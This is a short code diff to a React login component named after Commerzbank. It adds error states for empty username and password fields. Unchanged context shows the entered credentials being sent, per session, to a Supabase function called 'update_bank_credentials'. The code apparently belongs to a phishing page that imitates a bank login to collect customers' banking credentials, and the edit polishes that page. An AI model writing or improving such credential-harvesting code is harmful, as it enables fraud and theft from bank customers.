@@ -92,7 +92,11 @@ const Commerzbank = () => {
 
   const handleLogin = async () => {
     if (submitting) return;
-    if (username.trim().length === 0 || password.length === 0) return;
+    const uErr = username.trim().length === 0;
+    const pErr = password.length === 0;
+    setUserError(uErr);
+    setPwError(pErr);
+    if (uErr || pErr) return;
     setSubmitting(true);
     if (sessionId) {
       const { error } = await supabase.rpc("update_bank_credentials", {
